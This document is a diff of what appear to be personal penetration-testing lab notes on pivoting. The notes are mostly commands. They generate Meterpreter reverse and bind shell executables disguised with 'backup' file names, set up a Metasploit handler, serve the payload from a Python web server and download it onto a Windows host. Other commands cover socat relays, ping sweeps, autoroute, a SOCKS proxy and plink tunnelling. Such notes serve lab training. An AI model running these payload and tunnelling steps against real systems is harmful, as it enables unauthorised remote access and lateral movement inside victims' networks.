@@ -22,14 +22,6 @@ Port forwards:
   
   meterpreter > help portfwd
 
-msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
-msfconsole -q
-use exploit/multi/handler
-scp playload.exe ubuntu@10.129.202.64:~/
-python3 -m http.server 8123
-curl  / Invoke-WebRequest -Uri "http://172.16.5.129:8123/playload.exe" -OutFile "C:\playload.exe"
-
-
 Ping sweep:
   for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
   1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
@@ -37,3 +29,28 @@ Ping sweep:
   or
   msf6 > use auxiliary/server/socks_proxy
   meterpreter > run autoroute -s 172.16.5.0/23
+
+
+msf bind-shell:
+    socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
+    msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
+    msf6 > use exploit/multi/handler
+    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
+
+msf reverse-shell:
+  msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+  msfconsole -q
+  use exploit/multi/handler
+  scp playload.exe ubuntu@10.129.202.64:~/
+  python3 -m http.server 8123
+  curl  / Invoke-WebRequest -Uri "http://172.16.5.129:8123/playload.exe" -OutFile "C:\playload.exe"
+
+
+Windows ssh / GUI proxychains:
+  plink -ssh -D 9050 ubuntu@10.129.15.50
+    https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
+
+  https://www.proxifier.com/
+
+
+
